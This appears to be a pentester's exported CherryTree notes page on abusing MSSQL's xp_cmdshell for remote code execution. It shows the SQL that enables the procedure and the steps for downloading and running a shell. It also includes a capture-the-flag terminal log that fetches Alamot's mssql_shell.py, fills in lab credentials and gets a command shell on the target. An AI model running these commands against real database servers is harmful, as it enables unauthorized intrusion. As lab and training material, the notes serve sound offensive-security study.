<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>xp_cmdshell</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># xp_cmdshell</h1></strong><br />MSSQL databases have a stored procedure called <code>xp_cmdshell</code>, which is exactly what it sounds. <br />With it you&#39;ll have remote code execution on the server because you can execute system commands via the database. <br /><br />You&#39;ll have to enable <code>xp_cmdshell</code> first before you can use it.<br /><br /><code>EXEC master.sys.xp_cmdshell whoami</code> - execute command<br /><br /><strong><h2>## Manually enable xp_cmdshell</h2></strong><br />Commands can be run in a sequence in mssql, up to <code>go</code> where they will be run.<br />If you run into problems, run each fo the commands + go step by step so that you can read errors.<br /><br /><code>xp_cmdshell</code> also likes to disable itself, so you might have to re-enable it rather frequently.<br /><br /><code>EXEC SP_CONFIGURE N&#39;show advanced options&#39;, 1</code><br /><code>EXEC SP_CONFIGURE N&#39;xp_cmdshell&#39;, 1</code><br /><code>RECONFIGURE</code><br /><code>go</code><br /><div class="codebox"><div class="codebox">1&gt;&nbsp;EXEC&nbsp;SP_CONFIGURE&nbsp;N&#39;show&nbsp;advanced&nbsp;options&#39;,&nbsp;1<br />2&gt;&nbsp;EXEC&nbsp;SP_CONFIGURE&nbsp;N&#39;xp_cmdshell&#39;,&nbsp;1<br />3&gt;&nbsp;RECONFIGURE<br />4&gt;&nbsp;go<br />Configuration&nbsp;option&nbsp;&#39;show&nbsp;advanced&nbsp;options&#39;&nbsp;changed&nbsp;from&nbsp;1&nbsp;to&nbsp;1.&nbsp;Run&nbsp;the&nbsp;RECONFIGURE&nbsp;statement&nbsp;to&nbsp;install.<br />(return&nbsp;status&nbsp;=&nbsp;0)<br />Configuration&nbsp;option&nbsp;&#39;xp_cmdshell&#39;&nbsp;changed&nbsp;from&nbsp;1&nbsp;to&nbsp;1.&nbsp;Run&nbsp;the&nbsp;RECONFIGURE&nbsp;statement&nbsp;to&nbsp;install.<br /><br />(return&nbsp;status&nbsp;=&nbsp;0)<br />1&gt;&nbsp;xp_cmdshell&nbsp;&quot;whoami&quot;<br />2&gt;&nbsp;go<br /><br />tally\sarah</div></div><br /><br /><strong><h2>## Get shell using xp_cmdshell</h2></strong><br /><strong><h3>### Manually</h3></strong><br />You could get a shell manually by: <br />• enabling xp_cmdshell<br />• downloading a shell to the target system using <code>xp_cmdshell </code><br />• run said shell<br /><br /><strong><h3>### Alamot&#39;s mssql_shell.py</h3></strong><br />Alamot has a script that will use <code>xp_cmdshell</code> to get a shell for you.<br />You&#39;ll have to edit the script with connection info.<br />All credit here - <a href="https://alamot.github.io/mssql_shell/">https://alamot.github.io/mssql_shell/</a><br /><div class="codebox"><div class="codebox">root@gotham:~/ctf/querier/1433ms-sql#&nbsp;wget&nbsp;https://raw.githubusercontent.com/Alamot/code-snippets/master/mssql/mssql_shell.py<br />...<br />root@gotham:~/ctf/querier/1433ms-sql#&nbsp;nano&nbsp;mssql_shell.py&nbsp;<br />...<br />MSSQL_SERVER=&quot;10.10.10.125&quot;<br />MSSQL_USERNAME&nbsp;=&nbsp;&quot;querier.htb.local\mssql-svc&quot;<br />MSSQL_PASSWORD&nbsp;=&nbsp;&quot;corporate568&quot;<br />...<br />root@gotham:~/ctf/querier/1433ms-sql#&nbsp;python&nbsp;mssql_shell.py<br />Successful&nbsp;login:&nbsp;querier.htb.local\mssql-svc@10.10.10.125<br />Trying&nbsp;to&nbsp;enable&nbsp;xp_cmdshell&nbsp;...<br />CMD&nbsp;mssql-svc@QUERIER&nbsp;C:\Windows\system32&gt;</div></div><br /><br /><br /></div>
</body>
</html>
